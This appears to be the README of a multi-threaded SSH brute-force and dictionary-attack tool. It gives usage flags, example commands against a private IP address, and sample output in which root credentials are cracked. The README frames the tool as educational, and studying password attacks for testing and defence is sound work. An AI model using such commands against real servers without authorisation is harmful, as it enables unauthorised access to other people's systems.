# SSH Brute Forcer

A simple, multi-threaded SSH brute force tool designed for basic brute forcing and dictionary-based attacks.

## Features

- **Multi-Threading**:
  - Utilizes multiple threads to attempt concurrent connections, potentially increasing speed.
  - Be cautious: Creating an excessive number of threads (e.g., 1000) can overwhelm the system. This feature is primarily for demonstration purposes and should be used with care.

- **Standard Brute Forcing**:
  - Tests random strings of varying lengths, which is generally inefficient and not recommended for serious use.

- **Dictionary-Based Attacks**:
  - Supports using a list of passwords from a file for more targeted attacks.

## Usage

```
$ ./ssh-brute-forcer -h <hostname> -p <port> [-u <username>] [-p <password> | -P <password_list>] [-t <thread_count>] [-V]
```
Parameters

    -h <hostname>: The SSH server’s hostname or IP address.
    -p <port>: The SSH port (default is 22).
    -u <username>: Specific username to test.
    -p <password>: Specific password to test.
    -P <password_list>: Path to a file with a list of passwords.
    -t <thread_count>: Number of threads for concurrent testing (default is 4).
    -V: Verbose mode to display attempted passwords.

Example Commands

    Test a Single Username and Password:

```
$ ./ssh-brute-forcer -h 192.168.1.142 -p 22 -u myuser -p mypassword -t 10 -V
```

This command tests the provided username and password using 10 threads and displays the attempted passwords.

Dictionary-Based Attack with a Username and Password List:

```
$ ./ssh-brute-forcer -h 192.168.1.142 -p 22 -u myuser -P pass.list -t 10 -V

```

    This command tests the specified username with all passwords from pass.list using 10 threads, showing attempted passwords.

Note

The brute force method of trying random strings is highly inefficient and not suitable for practical use. Additionally, using a large number of threads can significantly impact system performance and stability. This tool is intended primarily for educational purposes and should be used responsibly.

```
$ ./ssh-brute-forcer -h 192.168.1.142 -p 777 -u root  -P pass.list -t 10 -V  
Attempting - Username: root, Password: asd
Attempting - Username: root, Password: sdf
Attempting - Username: root, Password: dg
Attempting - Username: root, Password: asdfasdfsad
Attempting - Username: root, Password: f
Attempting - Username: root, Password: ga
Attempting - Username: root, Password: sadf
Attempting - Username: root, Password: asdfa
Attempting - Username: root, Password: sdf
Attempting - Username: root, Password: asdfg
Attempting - Username: root, Password: f
Attempting - Username: root, Password: dsf
Attempting - Username: root, Password: asdf
Attempting - Username: root, Password: df
Attempting - Username: root, Password: sad
Attempting - Username: root, Password: as
Attempting - Username: root, Password: asdf
Attempting - Username: root, Password: asdasdf
Attempting - Username: root, Password: fasdgafadf
Attempting - Username: root, Password: asd
Attempting - Username: root, Password: toor
Credentials found - Username: root, Password: toor
```
